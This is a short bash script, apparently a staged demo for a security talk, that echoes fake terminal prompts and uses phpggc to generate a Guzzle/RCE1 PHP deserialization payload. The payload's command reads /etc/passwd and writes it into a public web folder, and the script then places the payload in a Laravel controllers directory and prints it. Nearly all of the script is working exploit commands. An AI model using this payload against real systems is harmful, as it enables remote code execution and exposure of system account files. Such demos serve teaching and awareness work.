#!/bin/bash

cd /home/liam/Projects/talks/hackthesystem/tools/phpggc

echo '[liam@liam-laptop hackthesystem]$ ./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload'

sleep 5
./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload

echo '[liam@liam-laptop hackthesystem]$ mv payload ../../laravel/app/Http/Controllers/'

sleep 2;
mv payload ../../laravel/app/Http/Controllers/


echo '[liam@liam-laptop hackthesystem]$ cat ../../laravel/app/Http/Controllers/payload'
sleep 2;
cat ../../laravel/app/Http/Controllers/payload
